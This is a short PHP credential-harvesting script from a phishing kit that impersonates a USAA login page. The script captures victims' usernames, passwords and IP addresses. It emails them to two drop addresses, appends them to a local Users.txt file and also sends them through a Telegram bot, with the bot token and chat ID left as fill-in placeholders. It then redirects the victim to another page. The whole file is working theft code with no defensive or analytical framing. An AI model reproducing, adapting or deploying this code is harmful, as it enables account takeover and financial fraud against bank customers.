<?php

$ip = getenv("REMOTE_ADDR");
$message .= "------------+ Able-God Version 2022 +-------------\n";
$message .= "USER   : ".$_POST['Uid']."\n";
$message .= "PAZZ   : ".$_POST['psw']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "--------------+ Powered By Ability +--------------\n";
$send = "savemyresults2022@yandex.ru, savemyresults2022@protonmail.com";
$subject = "USAA-Login .$ip.";
$headers .= "MIME-Version: 1.0\n";
$headers .= "From: USAA <USAA@webmail.com>\n";
$arr=array($send, $IP);

mail($send,$subject,$message,$headers);


$fp = fopen("../Users.txt","a");
fputs($fp,$message);
fclose($fp);

header( "Location: ../doc.php" );
	
//report to telegram
function sendMessage($chatID, $messaggio, $token) {
    echo "sending message to " . $chatID . "\n";

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
$token = "Your Token Here";
$chatid = "Your ChatID Here";
sendMessage($chatid, $message, $token);
 
?>

